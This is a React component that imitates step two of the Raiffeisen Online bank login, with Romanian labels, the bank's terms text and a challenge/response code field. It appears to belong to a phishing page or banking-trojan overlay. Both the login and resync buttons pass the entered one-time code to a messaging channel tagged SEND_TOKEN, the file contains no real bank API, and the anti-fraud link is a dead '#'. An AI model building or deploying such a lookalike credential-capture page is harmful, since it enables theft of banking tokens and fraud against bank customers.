import React, { useState, useEffect } from 'react'
import lock from '../media/lock.png'
import { storage } from '../storage/storage'
import { RightPart } from './RightPart'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'

export const Step_2 = props => {
  const { changeStore, store } = props
  const { step_1_cod, challenge, step_2_cod, error } = store
  const [password, setPassword] = useState(step_2_cod)

  const setError = val => changeStore({ error: val })


  const handleChange = (value) => {
    setPassword(value)
  }

  const handleSubmit = () => {
    if (!password) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_TOKEN, payload: password })

    changeStore({
      step_2_cod: password,
      loading: true
    })

  }

  return (
    <div id="log-container" className="clr">
      <div >
        <div className="left">
          <div className="left-wrapper">
            <div className="base-form" >
              <p className="column">
                <label id="username">Cod utilizator</label>
                <input value={step_1_cod} readOnly={true} />
              </p>
              <p className="column">
                <label id="challenge">Challenge</label>
                {challenge}
              </p>
              <p className="column">
                <label id="passowrd">Parola</label>
                <input value={password} onChange={e => handleChange(e.target.value)} />
              </p>
              <div className="error">
                {error && 'Parola introdusa este gresita.'}
              </div>
              <p className="main-font">
                Odata cu introducerea codului de utilizator si a
                codului unic de autentificare, am luat la cunostinta
                Termenii si Conditiile Raiffeisen Online, respectiv
                Conditiile General Bancare
              </p>
              <p className="row buttons-container">
                <button onClick={handleSubmit}>Autentificare</button>
                <button onClick={handleSubmit}>Resincronizare</button>
              </p>
            </div>
          </div>
        </div>
        <div className="secure row">
          <img src={lock} alt="secure" />
          <a href="#">Cum imi pot proteja de frauda contul?</a>
        </div>
      </div>
      <RightPart {...props} />
    </div>
    
  )
}


